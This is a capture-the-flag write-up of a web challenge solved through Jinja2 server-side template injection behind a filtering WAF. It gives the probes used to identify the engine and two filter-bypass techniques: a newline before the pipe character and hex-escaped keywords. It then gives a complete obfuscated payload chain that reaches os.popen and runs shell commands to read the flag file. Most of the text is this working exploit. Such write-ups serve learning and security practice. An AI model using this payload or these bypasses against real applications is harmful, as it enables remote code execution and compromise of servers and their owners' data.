#Web 
## 1. Reconnaissance
Initial exploration of the website `https://netrunner.kurukshetraceg.org.in/c3/` revealed a "Template Renderer" with a single input field. A security message explicitly stated that a WAF was active, blocking certain characters and patterns.

## 2. Template Engine Identification
I tested several basic payloads to identify the template engine:
- `{{ 7*7 }}` returned `49`.
- `{{ 7*'7' }}` returned `7777777`.

The behavior of `{{ 7*'7' }}` strongly indicated that the engine was **Jinja2** (Python).

## 3. WAF Analysis
Testing various inputs revealed a strict WAF filtering the following:
- **Characters:** `.` (dot), `_` (underscore), `[` and `]` (square brackets), `|` (pipe).
- **Keywords:** `config`, `self`, `class`, `mro`, `subclasses`, and others.

However, I discovered two critical bypasses:
1. **Newline Bypass for Pipe:** The WAF only blocked the pipe character if it was on the same line as other content. Using a newline before the pipe (`\n|`) successfully bypassed this filter.
2. **Hex Encoding for Strings:** Jinja2 string literals allow hex escape sequences. I could represent underscores as `\x5f` and obfuscate blocked keywords (e.g., `class` as `cl\x61ss`).

## 4. Exploitation Path

### Step 1: Accessing the `object` class
Since dots and brackets were blocked, I used the `attr` filter and the `__getitem__` method to traverse the Python object hierarchy.
- **Goal:** Reach `request.__class__.__mro__[3]` (which is the `object` class).
- **Payload:**
  ```jinja2
  {{ request
  |attr('\x5f\x5fcl\x61ss\x5f\x5f')
  |attr('\x5f\x5fm\x72\x6f\x5f\x5f')
  |attr('\x5f\x5fget\x69tem\x5f\x5f')(3) }}
  ```

### Step 2: Finding a Useful Subclass
I listed all subclasses of `object` to find a way to execute system commands.
- **Payload:**
  ```jinja2
  {{ (...above...)|attr('\x5f\x5fsubcl\x61\x73ses\x5f\x5f')() }}
  ```
Scanning the output, I identified `os._wrap_close` at index **155**.

### Step 3: Achieving Remote Code Execution (RCE)
From `os._wrap_close`, I accessed the `os` module via `__init__.__globals__` and called `popen` to execute shell commands.
- **Payload Structure:**
  ```jinja2
  {{ request
  |attr('\x5f\x5fcl\x61ss\x5f\x5f')
  |attr('\x5f\x5fm\x72\x6f\x5f\x5f')
  |attr('\x5f\x5fget\x69tem\x5f\x5f')(3)
  |attr('\x5f\x5fsubcl\x61\x73ses\x5f\x5f')()
  |attr('\x5f\x5fget\x69tem\x5f\x5f')(155)
  |attr('\x5f\x5finit\x5f\x5f')
  |attr('\x5f\x5fgl\x6fb\x61ls\x5f\x5f')
  |attr('\x5f\x5fget\x69tem\x5f\x5f')('popen')('COMMAND')
  |attr('read')() }}
  ```

## 5. Flag Retrieval
Using the RCE payload, I explored the filesystem:
1. `ls -F` revealed a file named `flag` in the current directory.
2. `cat flag` successfully bypassed the WAF (as it contained no dots or restricted keywords) and returned the flag.

**Flag:** `CTF{t3mpl4t3_1nj3ct10n_m4st3r_2025}`
